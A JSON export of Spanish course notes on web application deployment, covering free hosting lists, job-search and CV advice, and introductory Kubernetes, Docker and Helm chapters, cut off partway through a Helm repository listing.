{"DAW/Despliegue-de-aplicaciones-web/Hosting-gratuitos":{"title":"Hosting gratuitos","links":[],"tags":[],"content":"Hosting PHP\n\nwww.infinityfree.com/\napp.laravel.cloud/\n\nGeneral\n\nrender.com/\n\nBase de datos\n\naiven.io/\nsupabase.com/pricing\nfirebase.google.com\n\nFree tier\n\nOracle cloud\n"},"DAW/Despliegue-de-aplicaciones-web/RA-1/Servidores-web":{"title":"Servidores web","links":[],"tags":[],"content":"\nNginx\nApache\nsimplewebserver.org/\nIaaS, PaaS, SaaS\n"},"DAW/Despliegue-de-aplicaciones-web/consejos-busqueda-de-trabajo":{"title":"consejos-busqueda-de-trabajo","links":[],"tags":[],"content":"Consejos b√∫squeda de trabajo\nEsto es un boceto de consejos generales. Ya se terminar√° de escribir.\nConsejos:\n\nCrea una cuenta en linkedin. Recuerda generar el enlace corto a tu perfil. Rellena en linkedin informaci√≥n sobre experiencia laboral, proyectos, tecnolog√≠as que conoces, intereses‚Ä¶\nCrea una cuenta en infojobs. De nuevo, rellena la informaci√≥n relevante en tu perfil.\nCrea una cuenta en Github. Sube proyectos p√∫blicos interesantes que hayas hecho en alg√∫n momento y te sientas orgulloso de ello. Recuerda redactar archivos Readme.md para entenderlos.\nCrea una web como portfolio. Algo muy sencillo es hacerlo con github pages. En ese portfolio describe tus intereses, proyectos interesantes, trabajos que hayas hecho, experiencia con herramientas o tecnolog√≠as, etc‚Ä¶\nCompra un dominio propio, algo parecido a www.nombreApellido.com. Lo puedes registrar a trav√©s de cloudflare.\nVincula tu dominio con tu web de portfolio. Ahora genera un c√≥digo QR con dicha web.\nCrea un curr√≠culum en papel (o formato folio/pdf). Puedes emplear la herramienta Canva para ello. En dicho curr√≠culum incluye los enlaces a tu perfil en github, linkedin e infojobs. Recuerda tambi√©n incluir el c√≥digo QR a tu p√°gina web portfolio. Rellena en el curr√≠culum tus intereses, tecnolog√≠as, proyectos, experiencia laboral y otros m√©ritos. Recuerda ser conciso. Debe ocupar 1 carilla o 2 como m√°ximo. Nunca m√°s de 2.\nLa foto de tus redes de networking y curr√≠culum debe ser profesional. Fondo blanco, transparente o desenfocado. Usa una camisa mejor que una camiseta. No salgas completamente de frente respecto a la c√°mara, mejor girar un poco el cuerpo y la cabeza.\n\nC√≥mo hacer el cv de papel:\n\nPoner foto. Normalmente suele ser un tema pol√©mico, pero en general recomiendo a√±adir la foto.\nA la derecha de la foto recomiendo a√±adir datos generales y contacto:\n\nnombre, apellidos, tel√©fono, email.\nNo suele recomendar poner fecha nacimiento, ni edad, ni direcci√≥n.\nfoto la suelo poner (fondo blanco, no de frente, camisa).\n\n\nDebajo de los datos de contacto:\n\nEnlace de tu perfil de linkedin, infojobs, github, portfolio, tryhackme/hackthebox/cyberdefenders/lets defend.\n\n\nSi la web de porfolio es muy buena, recomiendo generar un QR del enlace de la web y ponerla debajo de la foto de perfil.\nA la derecha del QR del portfolio recomiendo a√±adir un p√°rrafo o dos hablando de aspectos generales/introductorios/intereses sobre ti (proactivo, resolutivo, autodidacta).\nDebajo del QR y del p√°rrafo de descripci√≥n entramos en una secci√≥n donde mostramos qu√© sabemos:\n\nexperiencia laboral o proyectos (3-4 como m√°ximo) (las pr√°cticas es un ejemplo de experiencia laboral). Cada una de las experiencias laborales debe tener:\n\nNombre de la empresa - Cargo ( PE: desarrollador backend) - Fecha\nDescripci√≥n de lo que hiciste\nListado de tecnolog√≠as que usaste\n\n\nCon los proyectos que hayas hecho por tu cuenta sucede algo similar:\n\nNombre del proyecto, enlace (si est√° desplegado, por ejemplo, en github pages, infinityfree‚Ä¶) y fecha\nDescripci√≥n del proyecto\nTecnolog√≠as usadas.\n\n\n\n\nDebajo de la experiencia: formaci√≥n\n\nDAW\nASIR\nDAM\nSMR\nIngl√©s B2/C1\nNO recomiendo incluir la ESO o el bachiller.\n\n\nOtras formaciones/certificados\n\nCCNA (Cisco)\nEJPT\nCarn√© de conducir\n\n\nSolo si es relevante: Inquietudes\n"},"DAW/Despliegue-de-aplicaciones-web/devops":{"title":"devops","links":[],"tags":[],"content":"DevOps\nTODO: Algunas ideas que desarrollar en el futuro.\nMetodolog√≠a: Scrum (Agile) + Kanban\nCI/CD: Jenkins/Github actions\nTest unitarios, test de integraci√≥n, calidad de c√≥digo y vulnerabilidades: Jest + Sonarqube\nInfrastructure as Code: Terraform + ansible (para testear terraform se puede probar localstack)\nIaaS (ec2) vs PaaS (Vercel)\nTDD (Test Driven Development)\nAWS / Azure"},"DAW/Despliegue-de-aplicaciones-web/index":{"title":"Despliegue de aplicaciones web","links":["DAW/Despliegue-de-aplicaciones-web/kubernetes/","DAW/Despliegue-de-aplicaciones-web/consejos-busqueda-de-trabajo","DAW/Despliegue-de-aplicaciones-web/devops"],"tags":[],"content":"\nKubernetes\nconsejos-busqueda-de-trabajo\ndevops\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.0-introduccion-a-kubernetes":{"title":"1.0-introduccion-a-kubernetes","links":[],"tags":[],"content":"1. Introducci√≥n a Kubernetes\nEn los √∫ltimos a√±os se ha ido extendiendo el uso de contenedores como elementos esenciales para el uso de aplicaciones en entornos en producci√≥n, tanto m√°s cuanto m√°s variable sea la demanda, la frecuencia con la que se actualizan o la necesidad de que funcionen de forma ininterrumpida.\nGestionar una aplicaci√≥n sobre contenedores, que pueda actualizarse r√°pidamente, que sea escalable o tolerante a fallos, es una tarea compleja que se realiza mediante un software espec√≠fico que recibe el nombre de orquestador de contenedores.\nKubernetes es un software de orquestaci√≥n de contenedores desarrollado inicialmente por Google, pero que hoy en d√≠a es un proyecto libre independiente utilizado en gran cantidad de entornos diferentes y que se ha convertido en muchos casos en la soluci√≥n preferida para orquestar aplicaciones basadas en contenedores en entornos en producci√≥n.\nEn este curso conoceremos las principales caracter√≠sticas de Kubernetes y de las aplicaciones m√°s adecuadas para poner en este entorno y comprobaremos de forma pr√°ctica la tolerancia a fallos, la escalabilidad de una aplicaci√≥n o la gesti√≥n del versionado y los diferentes enfoques a la hora de hacerlo en entornos en producci√≥n, con o sin interrupciones."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.1-implantacion-de-aplicaciones-web-en-contenedores":{"title":"1.1-implantacion-de-aplicaciones-web-en-contenedores","links":[],"tags":[],"content":"1.1 Implantaci√≥n de aplicaciones web en contenedores\nEl protocolo http, o su extensi√≥n https, ha ido convirti√©ndose poco a poco en el ‚Äúsuperprotocolo‚Äù de Internet y ha ido desplazando paulatinamente el uso de otros protocolos.\nDe igual forma, la mayor parte del software que se consume hoy en d√≠a se podr√≠a denominar de forma gen√©rica como aplicaci√≥n web, aunque hay diferencias importantes sobre la forma de presentarse, ya que no es lo mismo que una persona acceda a una aplicaci√≥n a trav√©s de un navegador, a trav√©s de una aplicaci√≥n m√≥vil o que quien acceda a la aplicaci√≥n sea una m√°quina.\nEn este curso no podemos entrar en detalle sobre las caracter√≠sticas de estas aplicaciones web, pero s√≠ en las caracter√≠sticas que deben tener los sistemas que las ofrecen para que cumplan con los requisitos esperados.\nRequisitos habituales de las aplicaciones web\nPensemos inicialmente en el caso de una aplicaci√≥n interna de una empresa que est√° instalada localmente y que los √∫nicos usuarios que tiene son la plantilla de empleados de la empresa. En ese caso, es f√°cil determinar los recursos necesarios para que la aplicaci√≥n funcione de forma adecuada, porque ni el uso de la aplicaci√≥n se dispara en unos instantes, ni el n√∫mero de empleados de una empresa var√≠a de forma abrupta.\nPor otra parte, las actualizaciones se pueden hacer en momentos en los que el uso es m√≠nimo y, si es necesario una interrupci√≥n del servicio, se puede programar para un momento determinado en que tenga muy poco impacto. Las aplicaciones de este tipo no se suelen modificar habitualmente, sino que lo hacen de forma bastante espaciada en el tiempo, por lo que los cambios entre una versi√≥n y otra son significativos. Esto, que podr√≠amos llamar inform√°tica tradicional, tambi√©n tiene un impacto importante en la forma de desarrollar las aplicaciones que funcionan bajo este esquema.\nPor otra parte, una aplicaci√≥n web que est√© disponible en Internet, tiene miles de millones de potenciales usuarios, que la pueden usar las 24 horas del d√≠a y cualquier d√≠a del a√±o. Esto tiene unas consecuencias muy importantes, ya que es muy dif√≠cil determinar los recursos necesarios para prestar servicios a una demanda muy variable e idealmente, el servicio no puede interrumpirse nunca.\nPero, ¬øesto c√≥mo se hace?. ¬øEs posible que el mismo sistema se ajuste a una demanda que puede variar de un usuario a un mill√≥n?, ¬øes posible tener un sistema siempre actualizado y que a la vez no se pare?, ¬øc√≥mo se aplican las actualizaciones de software?, ¬øpoco a poco o con grandes saltos?. Durante este curso, veremos que precisamente esto es lo que trata de proporcionar Kubernetes.\nComponentes auxiliares de un servicio web\nEl componente esencial para servir una aplicaci√≥n web es un servidor web, pero vamos a ver a continuaci√≥n, que para poder proporcionar el servicio con los requisitos anteriores, debe apoyarse en un n√∫mero importante de componentes auxiliares. En los siguientes apartados vamos a ir viendo paso a paso la forma de ir incluyendo diferentes componentes auxiliares y c√≥mo esta inclusi√≥n va a ir cambiando la arquitectura de los sistemas que proporcionan el servicio.\nPaso 1. Punto de partida\nSupongamos que nuestra organizaci√≥n proporciona tres aplicaciones web diferentes que son accesibles a trav√©s de las URL:\nexample.com/app1\nexample.com/app2\nexample.com/app3\nEstas aplicaciones pueden estar desarrolladas en el mismo lenguaje o en varios diferentes (Python, Java, PHP, etc.), pueden utilizar una base de datos, almacenamiento auxiliar y como se sirven a trav√©s de https, es necesario gestionar los certificados x509.\nEl esquema inicial que pensar√≠amos para proporcionar estas tres aplicaciones ser√≠a una m√°quina (f√≠sica o virtual) en la que instalar√≠amos el servidor web, los servidores de aplicaciones (php, java, ‚Ä¶), el servidor de bases de datos, etc‚Ä¶ tal y como aparece en la siguiente imagen:\n\nPaso 2. Servidor de bases de datos separado\nDesde un punto de vista de seguridad, ubicar el servidor de bases de datos en el mismo equipo que el servidor web es totalmente inadecuado, ya que el servidor web, por su propia naturaleza debe permitir que cualquier usuario acceda desde Internet y una vulnerabilidad en este equipo podr√≠a exponer los datos que se ubican en las bases de datos a un potencial atacante. Adem√°s, desde el punto de vista del rendimiento y la disponibilidad, separar los servicios en diferentes equipos hace que no haya interacciones entre ellos y no compitan por los mismos recursos.\n\nPaso 3. Servidores de aplicaciones en equipos separados\nEl coste computacional mayor en una aplicaci√≥n web suele recaer en los servidores de aplicaciones, que son los que ejecutan c√≥digo complejo, mientras que el servidor web se limita a servir el contenido generado por estos servidores de aplicaciones o los ficheros est√°ticos del sitio web. Al servir tres aplicaciones web diferentes desde el mismo equipo, podemos tener importantes interacciones entre ellas y que un aumento de uso de una aplicaci√≥n, repercuta negativamente en las otras. Es por esto, por lo que se puede separar estos servidores de aplicaci√≥n en equipos dedicados para cada una de ellas. La funci√≥n del servidor web en este caso, se acerca m√°s a la de un proxy inverso, que pasa la petici√≥n web a un equipo interno (el servidor de aplicaciones).\n\nPaso 4. Cach√© SQL\nLos servidores de aplicaciones consultan continuamente a los servidores de bases de datos y cada consulta conlleva un importante coste computacional y una ralentizaci√≥n de la respuesta. Si la misma consulta ya se ha realizado antes, se puede acelerar mucho la velocidad de respuesta con menor coste computacional utilizando un servicio de cach√© SQL, de manera que los servidores de aplicaciones se configuran para consultar al servidor cach√©, que servir√° directamente la respuesta si ya lo ha hecho anteriormente, o consultar√° al servidor de bases de datos en caso necesario. Memcached o redis son dos opciones muy utilizadas como cach√© SQL.\n\nPaso 5. Cach√© HTTP\nAl igual que se puede cachear la respuesta del servidor de bases de datos, se puede hacer lo mismo con la del servidor de aplicaciones o el servidor web. Dependiendo del servidor de aplicaciones, se puede ubicar este componente delante del servidor web o entre √©ste y el servidor de aplicaciones. Dicho de otro modo, podemos cachear http o alg√∫n otro protocolo como CGI, WSGI, etc. Un software muy conocido de cach√© http es varnish.\n\nPaso 6. Varios servidores de aplicaciones\nSi la demanda de alguna de las aplicaciones var√≠a de forma importante, se puede utilizar escalado horizontal, aumentando el n√∫mero de nodos de estos servidores de aplicaciones a la demanda de cada momento. Esto conlleva dos importantes modificaciones, el almacenamiento entre los servidores de aplicaci√≥n de la misma aplicaci√≥n tiene que estar distribuido de forma que garantice el uso concurrente y se deben repartir las peticiones a los diferentes servidores de aplicaci√≥n a trav√©s de un balanceador de carga.\n\nPaso 7. Alta disponibilidad en el resto de componentes\nNo solo se pueden escalar horizontalmente los servidores de aplicaciones, sino que si queremos ofrecer realmente alta disponibilidad en todos los niveles, debemos crear una arquitectura en la que la disponibilidad nunca dependa de uno solo nodo y el sistema pueda responder siempre ante incidencias puntuales en cualquier nivel.\n\nPaso 8. Microservicios y aplicaciones ‚Äútradicionales‚Äù\nUna de las opciones que se considera m√°s adecuada hoy en d√≠a para el desarrollo y puesta en producci√≥n de aplicaciones web es la utilizaci√≥n de microservicios. Con este enfoque los propios componentes de la aplicaci√≥n se separan en m√∫ltiples componentes que se ejecutan en nodos independientes (t√≠picamente contenedores) y se comunican unos con otros a trav√©s de servicios en red que ofrecen al resto.\nEstos microservicios no solo incluir√≠an de forma independiente los componentes que hemos explicado hasta ahora, sino que principalmente se refiere a la separaci√≥n de los componentes internos de la aplicaci√≥n en diferentes microservicios.\n\nPaso 9. Escalabilidad en los microservicios\nAl ofrecer microservicios no podemos tener dependencia de un solo nodo, por lo que al igual que en los pasos anteriores, se debe ofrecer la posibilidad de escalar cualquier componente a la demanda y que el sistema globalmente pueda responder ante cualquier error puntual.\n\nPaso 10. Microservicios en todas las aplicaciones\nEn lugar de utilizar microservicios en una aplicaci√≥n, podr√≠amos utilizarlos en todas, pero manteniendo los componentes auxiliares gestionados aparte.\n\nPaso 11. Todo en microservicios\nO podr√≠amos tener todo definido internamente en microservicios, tanto los componentes de cada aplicaci√≥n, como los componentes auxiliares.\n\nContenedores\nEn parte por lo que hemos explicado aqu√≠, y en parte por las ventajas que proporciona en el desarrollo de software y en el r√°pido despliegue, muchos de los componentes que hemos presentado se ejecutan no sobre m√°quinas virtuales o f√≠sicas, sino que lo hacen sobre contenedores de aplicaciones tipo docker (hoy en d√≠a se plantean otras alternativas como podman o containerd, pero no vamos a entrar en esa explicaci√≥n). Docker es capaz de gestionar esos contenedores de forma √°gil y r√°pida, pero no tiene funcionalidad para ejecutar escenarios tan complejos como los anteriores, que adem√°s se ejecutar√≠an l√≥gicamente en diferentes nodos f√≠sicos o virtuales (que a su vez ejecutar√≠an docker para los componentes de la aplicaci√≥n).\nConclusi√≥n\nEsto no son m√°s que un conjunto de componentes y una explicaci√≥n muy r√°pida de ellos, el orden y la ubicaci√≥n de ellos es variable en funci√≥n del caso de uso, pero en cualquier caso quer√≠amos presentarlos aqu√≠ para tener una visi√≥n global de hacia d√≥nde vamos. Algo que claramente podemos ver es que la gesti√≥n de este tipo de aplicaciones se convierte pronto en algo muy complejo, por lo que necesitamos apoyarnos en alg√∫n software que controle y gestione de forma adecuada estos sistemas tan complejos."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.2-docker":{"title":"1.2-docker","links":[],"tags":[],"content":"1.2 Docker\nDocker es una empresa (Docker Inc.) que desarrolla un software con el mismo nombre, de forma m√°s concreta el software denominado (docker engine), que ha supuesto una revoluci√≥n en el desarrollo de software, muy ligado al uso de contenedores de aplicaciones, a las aplicaciones web y al desarrollo √°gil.\nDocker permite gestionar contenedores a alto nivel, proporcionando todas las capas y funcionalidad adicional y, lo m√°s importante de todo, es que proporciona un nuevo paradigma en la forma de distribuir las aplicaciones, ya que se crean im√°genes en contenedores que se distribuyen, de manera que el contenedor que se ha desarrollado es id√©ntico al que se utiliza en producci√≥n y deja de instalarse la aplicaci√≥n de forma tradicional.\nComponentes de docker\nDocker engine tiene los componentes que a grosso modo se presentan a continuaci√≥n:\n\nEn la imagen se han destacado los componentes que son relevantes desde el punto de vista de este curso, ya que como veremos m√°s adelante, docker podr√≠a ser un componente esencial de Kubernetes, pero realmente no lo es completo, solo containerd y los elementos que √©ste proporciona lo son, ya que k8s utiliza su propia API, su propia l√≠nea de comandos y gestiona el almacenamiento y las redes de forma independiente a docker.\nEvoluci√≥n del proyecto docker\nDocker tuvo un enorme √©xito y una gran repercusi√≥n, pero la empresa que lo desarrolla siempre se ha movido en el dilema de c√≥mo sacar rendimiento econ√≥mico a su software, que al ser desarrollado bajo licencia libre, no proporciona beneficio como tal. Este dilema se ha tratado de resolver con modificaciones en la licencia o con doble licenciamiento (docker CE y docker EE en estos momentos), pero esto a su vez ha propiciado que otras empresas desarrollasen alternativas a docker para no depender en el futuro de una empresa sin un modelo de negocio claro y ante posibles modificaciones de la licencia libre de docker.\nLos cambios m√°s significativos que han ocurrido en docker se enumeran a continuaci√≥n:\n\nMoby Docker engine se desarrolla ahora como proyecto de software libre independiente de Docker Inc. denomin√°ndose Moby. De este proyecto se surten las distribuciones de linux para desarrollar los paquetes docker.io\nDocker Engine Versi√≥n desarrollada por Docker Inc.\nrunC Componente que ejecuta los contenedores a bajo nivel. Actualmente desarrollado por OCI\ncontainerd Componente que ejecuta los contenedores e interact√∫a con las im√°genes. Actualmente desarrollado por la CNCF.\n\nLimitaciones de docker (docker engine)\nDocker (docker engine) gestiona completamente la ejecuci√≥n de un contenedor en un determinado nodo a partir de una imagen, pero no proporciona toda la funcionalidad que necesitamos para ejecutar aplicaciones en entornos en producci√≥n.\nExisten diferentes preguntas que nos podemos hacer acerca de esto :\n\n¬øQu√© hacemos con los cambios entre versiones?\n¬øC√≥mo hacemos los cambios en producci√≥n?\n¬øC√≥mo se balancea la carga entre m√∫ltiples contenedores iguales?\n¬øC√≥mo se conectan contenedores que se ejecuten en diferentes demonios de docker?\n¬øSe puede hacer una actualizaci√≥n de una aplicaci√≥n sin interrupci√≥n?\n¬øSe puede variar a demanda el n√∫mero de r√©plicas de un determinado contenedor?\n¬øEs posible mover la carga entre diferentes nodos?\n\nLas respuestas a estas preguntas no pueden venir de docker engine, ya que no es un software desarrollado para eso, tiene que venir de alg√∫n software que pueda utilizar docker o parte de √©l y que sea capaz de comunicar m√∫ltiples nodos para proporcionar de forma coordinada estas funcionalidades. Ese software se conoce de forma gen√©rica como orquestador de contenedores."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.3-orquestadores-de-contenedores":{"title":"1.3-orquestadores-de-contenedores","links":[],"tags":[],"content":"1.3 Orquestadores de contenedores\nTan pronto como se fue extendiendo el uso de docker para el desarrollo de aplicaciones web, surgi√≥ la necesidad de desarrollar software de orquestadores de contenedores para gestionar de forma coordinada m√∫ltiples nodos en los que se estuvieran ejecutando contenedores y para proporcionar funcionalidad no ofrecida por docker engine y que es necesaria en la puesta en producci√≥n de la aplicaci√≥n.\nDocker swarm\nL√≥gicamente la propia empresa Docker Inc. comenz√≥ pronto el desarrollo de su orquestador que extend√≠a la funcionalidad de docker y cre√≥ el proyecto Swarm (enjambre), aunque en las √∫ltimas versiones de docker-engine, ya se incluye swarm como un componente y no es necesario instalarlo de forma separada.\nActualmente se considera que docker swarm es una soluci√≥n de orquestaci√≥n de contenedores sencilla y que es adecuada para determinados entornos no muy exigentes, pero no puede competir con Kubernetes en grandes entornos expuestos a Internet. Su desarrollo contin√∫a, pero ya no como un competidor de Kubernetes, de hecho la propia Docker Inc. publicita Kubernetes como un producto sobre el que ofrecen servicios.\nApache Mesos\nApache Mesos es un proyecto de software libre que proporciona un orquestador de contenedores. Este proyecto actualmente est√° bajo el paraguas de la Apache Software Foundation, pero originalmente fue desarrollado por la empresa Mesosphere, hoy renombrada a D2iQ. Mesos ha ido derivando de un competidor de Kubernetes hacia un software que proporcione soluciones m√°s espec√≠ficas, como DC/OS.\nHashicorp Nomad\nNomad es un proyecto de la prestigiosa empresa Hashicorp (Vagrant, Terraform, etc.) y su idea es ser un software de orquestaci√≥n m√°s simple, que se centre en la gesti√≥n del cluster de nodos y la ejecuci√≥n de contenedores en ellos, pero sin proporcionar todo el resto de funcionalidad adicional, por lo que Nomad se utiliza junto a otro software cuando se pone en producci√≥n."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.4-el-proyecto-kubernetes":{"title":"1.4-el-proyecto-kubernetes","links":[],"tags":[],"content":"1.4 El proyecto Kubernetes\nEl proyecto Kubernetes lo inicia Google en 2014 como un software (libre) para orquestar contenedores. En aquel momento hab√≠a varios proyectos de software que quer√≠an extender las posibilidades del uso de contenedores de aplicaciones tipo docker a entornos en producci√≥n, lo que de forma gen√©rica se conoce como orquestadores de contenedores. A diferencia del resto, Kubernetes no es un proyecto que se desarrolla desde cero, sino que aprovecha todo el conocimiento que ten√≠a Google con el uso de la herramienta interna Borg, de manera que cuando se hace p√∫blica la primera versi√≥n de Kubernetes, ya era un software con muchas funcionalidades.\nUn proyecto se convierte en software libre cuando utiliza una licencia libre, pero otro aspecto importante es la gobernanza del proyecto, es decir, si el desarrollo es abierto o no, si las decisiones sobre las nuevas funcionalidades las toma una empresa o se consens√∫an, etc. Si un proyecto de software libre lo inicia una √∫nica empresa, siempre existe la desconfianza de que ese proyecto vaya a ir encaminado a beneficiar a esa empresa. En este caso, la empresa en cuesti√≥n era un gigante como Google, por lo que aunque el proyecto era muy interesante, exist√≠a cierto recelo de gran parte del sector inicialmente. Para conseguir que una parte importante del sector se sumase al proyecto, Google tom√≥ la decisi√≥n de desvincularse del mismo y ceder el control a la Cloud Native Compute Foundation (CNCF), por lo que Kubernetes es un proyecto de software libre de fundaci√≥n, en el que se admiten contribuciones de forma abierta y donde las reglas de la gobernanza recaen sobre los miembros de la fundaci√≥n, normalmente un conjunto amplio de grandes empresas del sector. Es decir, aunque hoy en d√≠a hay quien habla de Kubernetes como el software de orquestaci√≥n de contenedores de Google, esto es un error, es un proyecto que gestiona desde hace a√±os la CNCF, a la que ni siquiera pertenece Google.\n¬øQu√© es Kubernetes?\nKubernetes es un software pensado para gestionar completamente el despliegue de aplicaciones sobre contenedores, realizando este despliegue de forma completamente autom√°tica y poniendo un gran √©nfasis en la escalabilidad de la aplicaci√≥n, as√≠ como el control total del ciclo de vida. Por destacar algunos de los puntos m√°s importantes de Kubernetes, podr√≠amos decir:\n\nDespliega aplicaciones r√°pidamente\nEscala las aplicaciones al vuelo\nIntegra cambios sin interrupciones\nPermite limitar los recursos a utilizar\n\nKubernetes est√° centrado en la puesta en producci√≥n de contenedores y por su gesti√≥n es indicada para administradores de sistemas y personal de equipos de operaciones. Por otra parte, afecta tambi√©n a los desarrolladores, ya que las aplicaciones deben adaptarse para poder desplegarse en Kubernetes.\nCaracter√≠sticas principales\nKubernetes surge como un software para desplegar aplicaciones sobre contenedores que utilicen infraestructura en nube (p√∫blica, privada o h√≠brida). Aunque puede desplegarse tambi√©n en entornos m√°s tradicionales como servidores f√≠sicos o virtuales, no es su ‚Äúentorno natural‚Äù.\nKubernetes es extensible, por lo que cuenta con gran cantidad de m√≥dulos, plugins, etc.\nEl nombre del proyecto proviene de una palabra de griego antiguo que significa timonel y habitualmente se escribe de forma abreviada como k8s.\nCaracter√≠sticas del software\nKubernetes est√° desarrollado en el lenguaje Go como diversas aplicaciones de este sector. La primera versi√≥n de Kubernetes se public√≥ el 7 de junio de 2014, aunque la m√°s antigua disponible en el repositorio es la v0.2, de septiembre de 2014.\nLa licencia utilizada en Kubernetes es la Apache License v2.0, licencia de software libre permisiva, muy utilizada √∫ltimamente en proyectos de fundaci√≥n en los que est√°n involucrados empresas, ya que no se trata de una licencia copyleft, que no permitir√≠a su inclusi√≥n en software que no sea libre, mientras que la licencia Apache s√≠ lo permite en determinadas circunstancias.\nEl c√≥digo de Kubernetes se gestiona a trav√©s de Github en cuyo repositorio se puede ver la gran cantidad de c√≥digo desarrollado en estos a√±os (m√°s de 100000 ‚Äúcommits‚Äù) y las miles de personas que han participado en mayor o menor medida. La √∫ltima versi√≥n de Kubernetes en el momento de escribir esta documentaci√≥n es la 1.23 y el proyecto actualmente est√° publicando dos o tres versiones nuevas cada a√±o.\nEn cualquier caso la versi√≥n de Kubernetes no es algo esencial para los contenidos de este curso, porque se van a tratar los elementos b√°sicos, que ya est√°n muy establecidos y, salvo alg√∫n detalle menor, se puede realizar este curso al completo con una versi√≥n de Kubernetes diferente a la utilizada para la documentaci√≥n.\nEl ecosistema\nDe entre todas las opciones de orquestadores de contenedores disponibles, hoy se considera que la opci√≥n preferida en la mayor parte de los casos es k8s y se ha desarrollado un enorme ecosistema de aplicaciones alrededor que proporcionan algunas funcionalidades que no tiene k8s o que de alguna forma utiliza o se pueden integrar de diferente forma con k8s. Este ecosistema de aplicaciones est√° actualmente en plena ‚Äúebullici√≥n‚Äù y es posible que en unos a√±os algunos de esos proyectos se estabilicen y otros desaparezcan, ya que en muchos casos solapan unos con otros.\nlandscape.cncf.io/"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.5-arquitectura-basica-de-kubernetes":{"title":"1.5-arquitectura-basica-de-kubernetes","links":[],"tags":[],"content":"1.5 Arquitectura b√°sica de Kubernetes\nNodos\nk8s es un software que se instala en varios nodos que se gestionan de forma coordinada, es decir, un cl√∫ster de nodos. Aunque es posible en casos muy peculiares instalar algunos nodos sobre sistemas Windows, la situaci√≥n normal es que se trate de un cluster de nodos linux. No es necesario que todos los nodos tengan la misma versi√≥n y ni siquiera que sean la misma distribuci√≥n, aunque en muchos casos s√≠ lo sea por simplicidad en el despliegue y mantenimiento.\nLos nodos del cl√∫ster pueden ser m√°quinas f√≠sicas o virtuales, pero quiz√°s lo m√°s habitual es que se traten de instancias de nube de infraestructura, es decir, m√°quinas virtuales ejecut√°ndose en alg√∫n proveedor de IaaS (AWS, GCP, OpenStack, etc.)\nSe distingue entre dos tipos de nodos:\n\nLos nodos master: Son los que ejecutan los servicios principales de k8s y ordenan a los otros nodos los contenedores que deben ejecutar. Como el uso del t√©rmino master es √∫ltimamente muy controvertido en los paises de habla inglesa, se est√° cambiando su denominaci√≥n por control plane node.\nLos nodos worker: Son los que reciben las √≥rdenes de los controladores y en los que se ejecutan los contenedores de las aplicaciones.\n\nComponentes de un nodo master\n\nkube-apiserver Gestiona la API de k8s\netcd Almac√©n clave-valor que guarda la configuraci√≥n del cl√∫ster\nkube-scheduler Selecciona el nodo donde ejecutar los contenedores\nkube-controller-manager Ejecuta los controladores de k8s\ndocker/rkt/containerd/‚Ä¶ Ejecuta los contenedores que sean necesarios en el controlador\ncloud-controller-manager Ejecuta los controladores que interact√∫an con el proveedor de nube:\n\nnodos\nenrutamiento\nbalanceadores\nvol√∫menes\n\n\n\nComponentes de un nodo worker\n\nkubelet Controla los Pods asignados a su nodo\nkube-proxy Permite la conexi√≥n a trav√©s de la red\ndocker/rkt/containerd/‚Ä¶ Ejecuta los contenedores\nsupervisord Monitoriza y controla kubelet y docker\n\nComplementos (addons)\nLos elementos anteriores forman la estructura b√°sica de k8s, pero es muy habitual que se proporcione funcionalidad adicional a trav√©s de complementos de k8s, que en muchas ocasiones se ejecutan a su vez como contenedores y son gestionados por el propio Kubernetes. Algunos de estos complementos son:\n\nCluster DNS Proporciona registros DNS para los servicios de k8s. Normalmente a trav√©s de CoreDNS\nWeb UI Interfaz web para el manejo de k8s\nContainer Resource Monitoring Recoge m√©tricas de forma centralizada. M√∫ltiples opciones: prometheus, sysdig\nCluster-level Logging Almacena y gestiona los logs de los contenedores\n\nEsquema de nodos y componentes\nSe crea un cluster de k8s en los que algunos nodos act√∫an como master (normalmente se crea un conjunto impar de nodos master que proporcionen alta disponibilidad) y el resto act√∫a como worker en los que se ejecutan los contenedores de las aplicaciones. Los nodos se comunican entre s√≠ a trav√©s de una red que proporciona la capa de infraestructura y se crea una red para la comunicaci√≥n de los contenedores, que suele ser una red de tipo overlay.\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.0-instalacion-de-aplicaciones-en-kubernetes-con-helm":{"title":"10.0-instalacion-de-aplicaciones-en-kubernetes-con-helm","links":[],"tags":[],"content":"10. Instalaci√≥n de aplicaciones en Kubernetes con Helm\nComo hemos estudiado en las unidades anteriores, una aplicaci√≥n real completa se compone de un conjunto amplio de objetos que definen Deployments, ConfigMaps, Services, etc. La API de Kubernetes no nos ofrece un ‚Äúsuperobjeto‚Äù que defina una aplicaci√≥n completa.\nNecesitamos herramientas para gestionar la aplicaci√≥n completa: empaquetado, instaladores, control de la aplicaci√≥n en producci√≥n, etc. En esta unidad vamos a estudiar Helm, que es un software que nos permite empaquetar aplicaciones completas y gestionar el ciclo completo de despliegue de dicha aplicaci√≥n.\nHelm usa un formato de empaquetado llamado charts. Un chart es una colecci√≥n de archivos que describen un conjunto de recursos que nos permite desplegar una aplicaci√≥n en Kubernetes.\nLos charts son distribuidos en distintos repositorios, que podremos dar de alta en nuestra instalaci√≥n de Helm. Para buscar los distintos charts y los repositorios desde los que se distribuyen podemos usar la p√°gina Artifact Hub."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.1-instalacion-de-helm":{"title":"10.1-instalacion-de-helm","links":[],"tags":[],"content":"10.1 Instalaci√≥n de Helm\nOcultar\nHelm se distribuye como un √∫nico binario que podemos instalar de distintas formas. La √∫ltima versi√≥n del programa la podemos encontrar en esta p√°gina y podemos ver los distintos m√©todos de instalaci√≥n en la documentaci√≥n oficial.\nUna vez instalado podemos ver la versi√≥n de Helm que tenemos instalada:\nhelm version\n\nLos siguiente es indicar un repositorio para que podamos empezar a trabajar con helm, para ello:\nhelm repo add &quot;stable&quot; &quot;charts.helm.sh/stable&quot; --force-update\n\nY ahora el repositorio stable corresponde a charts.helm.sh/stable:\nhelm repo list\nNAME  \tURL                          